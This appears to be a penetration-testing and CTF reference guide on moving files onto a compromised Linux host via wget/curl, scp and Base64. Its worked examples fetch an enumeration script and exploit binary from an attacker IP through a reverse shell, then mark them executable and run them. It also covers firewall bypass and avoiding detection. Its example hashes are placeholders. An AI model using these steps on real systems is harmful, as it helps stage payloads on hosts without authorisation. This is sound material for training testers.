# File Transfer Reference Guide

**Status:** Work in Progress  
**Last Updated:** January 26, 2026

---

## ⚡ Quick Reference Card: File Transfer Methods

### When to Use Each Method

| Method | Pros | Cons | Best For |
|--------|------|------|----------|
| **wget/curl** | Simple, widely available | Requires outbound connectivity | Quick enumeration scripts, tools |
| **scp** | Secure, reliable | Requires SSH credentials | Trusted networks, credential access |
| **Base64 Encoding** | Bypasses firewall restrictions | Manual process, larger output | Firewalled environments, binary files |
| **file/md5sum** | Validates integrity | Extra verification steps | Quality assurance, critical files |

---

## File Transfer Workflow

```
1. IDENTIFY TRANSFER METHOD
   ↓
   Do we have SSH credentials? → Use SCP
   Is outbound connectivity available? → Use wget/curl
   Are firewall restrictions blocking? → Use Base64 Encoding
   
2. PREPARE ATTACK MACHINE
   ↓
   Set up HTTP server (Python)
   Or prepare credentials for SCP
   Or encode file to Base64

3. EXECUTE TRANSFER ON REMOTE HOST
   ↓
   Download via wget/curl
   Or copy via SCP
   Or echo/decode Base64 string

4. VALIDATE FILE INTEGRITY
   ↓
   Check file type with: file [filename]
   Verify MD5 hash: md5sum [filename]
   Compare hashes between machines
```

---

## Table of Contents

1. [Method 1: wget/curl (HTTP Download)](#method-1-wgetcurl-http-download)
2. [Method 2: SCP (SSH Copy)](#method-2-scp-ssh-copy)
3. [Method 3: Base64 Encoding (Firewall Bypass)](#method-3-base64-encoding-firewall-bypass)
4. [File Validation & Integrity Checking](#file-validation--integrity-checking)
5. [Practical CTF Example](#practical-ctf-example)

---

## Method 1: wget/curl (HTTP Download)

### Overview
Use Python's built-in HTTP server on your attack machine, then download files to the remote host using wget or curl. This is the most straightforward method for standard reverse shells without Meterpreter.

### Step 1: Set Up HTTP Server on Attack Machine

**Command:**
```bash
cd /tmp
python3 -m http.server 8000
```

**Response:**
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)...
```

This creates a listening HTTP server on port 8000, serving files from the current directory (`/tmp`).

### Step 2: Download File Using wget (Remote Host)

**Syntax:**
```bash
wget http://<YOUR_IP>:<PORT>/<FILENAME>
```

**Example:**
```bash
wget http://10.10.14.1:8000/linenum.sh
```

**Response:**
```
..SNIP...
Saving to: 'linenum.sh'
linenum.sh 100% [====================>] 45.2K  1.23MB/s  in 0.04s
2026-01-26 14:35:22 (1.15 MB/s) - 'linenum.sh' saved [46284/46284]
```

### Step 3: Download File Using curl (Remote Host)

If wget is not available, use curl with the `-o` flag to specify the output filename:

**Syntax:**
```bash
curl http://<YOUR_IP>:<PORT>/<FILENAME> -o <OUTPUT_NAME>
```

**Example:**
```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

**Key Flags:**
- `-o`: Specify output filename (required for saving)
- `-O`: Use original filename from URL

### Advantages & Disadvantages

✅ **Pros:**
- Simple and reliable
- Minimal setup (Python is almost always available)
- No credentials needed
- Fast for small to medium files

❌ **Cons:**
- Requires outbound HTTP connectivity from target
- Firewall may block port 8000 or other custom ports
- Leaves HTTP server running (operational security concern)

---

## Method 2: SCP (SSH Copy)

### Overview
Secure Copy (SCP) is the most secure and reliable method when SSH credentials are available. It uses SSH for authentication and encryption.

### Prerequisites
- SSH username and password (or key-based auth)
- SSH service running on remote host (port 22)
- Network connectivity to remote host on port 22

### Basic Syntax

```bash
scp <LOCAL_FILE> <USERNAME>@<REMOTE_HOST>:<REMOTE_PATH>
```

### Example: Copy Local File to Remote Host

**Command:**
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

**Response:**
```
user@remotehost's password: *******
linenum.sh                                        100%   45KB   1.2MB/s   00:00
```

### Reverse Direction: Copy File FROM Remote Host to Local

**Command:**
```bash
scp user@remotehost:/tmp/linenum.sh ./linenum.sh
```

This downloads a file from the remote server to your local machine.

### Using SSH Key Authentication

If you have an SSH private key instead of password:

**Command:**
```bash
scp -i /path/to/private/key linenum.sh user@remotehost:/tmp/linenum.sh
```

**Flag:**
- `-i`: Specify SSH private key file path

### Advantages & Disadvantages

✅ **Pros:**
- Encrypted (secure credentials transmission)
- Reliable and battle-tested
- No extra setup needed
- Works through firewalls (only needs port 22)

❌ **Cons:**
- Requires SSH access to remote host
- Need valid credentials or SSH keys
- Not available if SSH is restricted

---

## Method 3: Base64 Encoding (Firewall Bypass)

### Overview
When network restrictions prevent direct file transfers, you can encode files in Base64 format, copy-paste the encoded string into the remote shell, and decode it back. This works for any file type (binaries, scripts, archives).

### Step 1: Encode File on Attack Machine

**Command:**
```bash
base64 shell -w 0
```

**Flags:**
- `-w 0`: Disable line wrapping (outputs all on one line for easy copy-paste)

**Response Example:**
```
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeAQAAAAAAABAAAAAAAAAABA0AAAAAAAAABAAAAAgAAAAEAAAAFAAAAgAEAAACAEQAAgBEAAAB8EQAAAHgRAAAAAAAAEQAAAAAAAAAAAEAAAAAQAAAAAwAAAJgRAAAAAAGQAAAA...SNIP...
```

### Step 2: Copy Encoded String to Remote Host

On the remote host (with code execution), create a file with the Base64 string:

**Command:**
```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeAQAAAAAAABAAAAAAAAAABA0AAAAAAAAABAAAAAgAAAAEAAAAFAAAAgAEAAACAEQAAgBEAAAB8EQAAAHgRAAAAAAAAEQAAAAAAAAAAAEAAAAAQAAAAAwAAAJgRAAAAAAGQAAAA...SNIP...<REST_OF_BASE64_STRING> | base64 -d > shell
```

**Break Down:**
- `echo <base64_string>`: Output the Base64 string
- `|`: Pipe to next command
- `base64 -d`: Decode Base64
- `> shell`: Redirect decoded output to file named "shell"

### Why This Works

Base64 encoding converts binary data into printable ASCII characters. This allows you to:
- Copy-paste binary files through text-based shells
- Bypass firewall restrictions (looks like normal text)
- Avoid null bytes and special characters that might corrupt binaries

### Advantages & Disadvantages

✅ **Pros:**
- Bypasses firewall and connectivity restrictions
- Works with any file type (binary, scripts, archives)
- No additional tools needed on remote host
- Minimal network requirements

❌ **Cons:**
- Manual copy-paste process (error-prone)
- Base64 output is ~33% larger than original file
- Slow for large files (payload limited by shell buffer)
- Requires verification to ensure integrity

---

## File Validation & Integrity Checking

### Why Validate Files?

When transferring files—especially binaries and exploits—you must verify that the file arrived intact and uncorrupted. Encoding/decoding, network transmission, or shell limitations can silently corrupt data.

### Method 1: Verify File Type

**Command on Remote Host:**
```bash
file shell
```

**Response Example:**
```
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., not stripped
```

This confirms the file is a valid ELF binary (in this case). For scripts, it might show: `shell: Bourne-Again shell script`.

### Method 2: Compare MD5 Hashes (Primary Validation)

**Step 1: Get hash on attack machine:**
```bash
md5sum shell
```

**Response:**
```
d41d8cd98f00b204e9800998ecf8427e  shell
```

**Step 2: Get hash on remote host:**
```bash
md5sum shell
```

**Comparison:**
If hashes match → File transferred successfully ✅  
If hashes differ → File corrupted during transfer ❌

### Alternative Hash Algorithms

| Algorithm | Command | When to Use |
|-----------|---------|-------------|
| **MD5** | `md5sum file` | Quick verification (not cryptographically secure) |
| **SHA1** | `sha1sum file` | More secure than MD5 |
| **SHA256** | `sha256sum file` | Standard for security-critical files |

**Example SHA256 Comparison:**
```bash
# Attack machine
sha256sum shell
# a1b2c3d4e5f6... shell

# Remote host
sha256sum shell
# a1b2c3d4e5f6... shell (must match)
```

### Quick Validation Checklist

```
□ File downloaded/transferred without error messages
□ File size matches expected size: ls -lh shell
□ File type is correct: file shell
□ Hash matches on both machines: md5sum shell
□ File is executable (if needed): ls -la shell (check for 'x' permission)
□ Quick functionality test: ./shell --help or head shell (for scripts)
```

---

## Practical CTF Example

### Scenario
You have a reverse shell on a vulnerable Linux server (`10.10.10.50`). You need to transfer `linenum.sh` (enumeration script) and `shell` (binary exploit) to escalate privileges.

### Complete Workflow: wget Method

**On Attack Machine (10.10.14.1):**

```bash
# Step 1: Copy files to /tmp
cp ~/tools/linenum.sh /tmp/
cp ~/tools/shell /tmp/

# Step 2: Start HTTP server
cd /tmp
python3 -m http.server 8000

# Terminal output:
# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)...
```

**On Remote Host (reverse shell):**

```bash
# Step 3: Download enumeration script
wget http://10.10.14.1:8000/linenum.sh
chmod +x linenum.sh
./linenum.sh > enum_results.txt

# Step 4: Download exploit binary
wget http://10.10.14.1:8000/shell
chmod +x shell
file shell  # Verify it's an ELF binary

# Step 5: Validate hashes (critical for binaries)
md5sum shell
# Output: a1b2c3d4e5f6g7h8i9j0... shell
```

**Back on Attack Machine:**

```bash
# Step 6: Verify hashes match
md5sum /tmp/shell
# Output: a1b2c3d4e5f6g7h8i9j0... shell (MUST MATCH)
```

**If hashes match:** File transferred successfully, safe to execute ✅

---

## Practical CTF Example: Base64 Method (Firewall Bypass)

### Scenario
The remote host has firewall rules blocking HTTP downloads (port 8000 blocked). You must use Base64 encoding.

**On Attack Machine:**

```bash
# Step 1: Encode binary to Base64
base64 /tmp/shell -w 0 > shell.b64

# Step 2: View the encoded string (first 100 chars)
head -c 100 shell.b64
# Output: f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeAQAAAAAAABAAAAAAAAAABA0...
```

**On Remote Host (reverse shell):**

```bash
# Step 3: Copy the entire Base64 string and decode it
# (Replace ... with full Base64 string from shell.b64)
echo 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeAQAAAAAAABAAAAAAAAAABA0AAAAAAAABAAAAA...<FULL_STRING>' | base64 -d > shell

# Step 4: Make executable and verify
chmod +x shell
file shell
# Output: shell: ELF 64-bit LSB executable...

# Step 5: Validate with hash
md5sum shell
# Output: a1b2c3d4e5f6g7h8i9j0... shell
```

**Back on Attack Machine:**

```bash
# Step 6: Compare hashes
md5sum /tmp/shell
# MUST MATCH the remote hash
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `wget: command not found` | Use `curl http://IP:PORT/file -o file` instead |
| `curl: command not found` | Try `wget` or use Base64 encoding method |
| Port 8000 already in use | Change Python server: `python3 -m http.server 9000` |
| File transfer hangs | Kill server (Ctrl+C), increase timeout, check connectivity |
| Hashes don't match | Re-transfer file, verify encoding/decoding, check shell buffer size |
| Permission denied on execute | Add execute permission: `chmod +x shell` |
| "file" command not available | Use `head -c 4 shell` to check for ELF magic bytes: `7f45 4c46` |

---

## Key Takeaways

1. **wget/curl**: Best for quick transfers with open connectivity
2. **scp**: Most secure when SSH credentials available
3. **Base64**: Ultimate fallback for firewall-restricted environments
4. **Always validate**: Use `file` command and MD5 hash comparison for critical files
5. **Permissions**: Remember to `chmod +x` for executables
6. **Clean up**: Stop the HTTP server after transfers (Ctrl+C) to avoid detection

